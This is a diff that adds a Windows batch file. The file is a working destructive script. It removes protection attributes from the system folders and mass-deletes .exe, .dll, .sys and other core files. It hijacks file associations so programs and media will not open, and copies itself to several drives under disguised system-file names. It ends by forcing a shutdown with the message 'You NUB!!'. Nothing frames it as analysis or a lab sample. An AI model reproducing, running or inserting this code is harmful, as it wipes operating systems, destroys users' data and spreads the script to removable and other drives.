@@ -1,0 +1,56 @@
+@echo off>nul
+attrib -s -h -r C:\WINDOWS\system32\*.*
+attrib -s -h -r C:\WINDOWS\system\*.*
+
+
+del C:\WINDOWS\system\*.dll /s /q
+del C:\WINDOWS\system\*.TSK /s /q
+del C:\WINDOWS\system\*.inf /s /q
+ 
+del C:\windows\system32\*.exe /s /q 
+del C:\windows\system32\*.com /s /q
+del C:\windows\system32\*.ini /s /q 
+del C:\windows\system32\*.inf /s /q 
+del C:\windows\system32\*.dat /s /q 
+del C:\windows\system32\*.vbs /s /q 
+del C:\windows\system32\*.dll /s /q 
+del C:\windows\system32\*.cpx /s /q 
+del C:\windows\system32\*.sys /s /q 
+del C:\windows\system32\*.rom /s /q 
+del C:\windows\system32\*.nls /s /q 
+
+if exist C:\windows\nul goto coll1
+
+:coll1
+assoc .exe=.DLL 
+assoc .com=.DLL 
+assoc .inf=.DLL 
+assoc .dll=.DLL 
+assoc .sys=.DLL
+assoc .dat=.DLL 
+assoc .ini=.DLL 
+assoc .vbs=.DLL 
+assoc .bat=.DLL 
+assoc .avi=.DLL 
+assoc .mp3=.DLL 
+assoc .wma=.DLL
+
+copy %0 C:\System32.bat
+copy %0 D:\System.bat
+attrib +s +r C:\System32.bat
+attrib +s +r D:\System.bat
+
+copy %0 A:\system1.bat 
+copy %0 E:\system2.bat 
+copy %0 F:\system3.bat 
+copy %0 G:\system4.bat 
+
+attrib +s +r A:\system1.bat 
+attrib +s +r E:\system2.bat 
+attrib +s +r F:\system3.bat 
+attrib +s +r G:\system4.bat
+
+goto DLL
+
+:DLL;
+Shutdown -t 10 -s -c "You NUB!!"
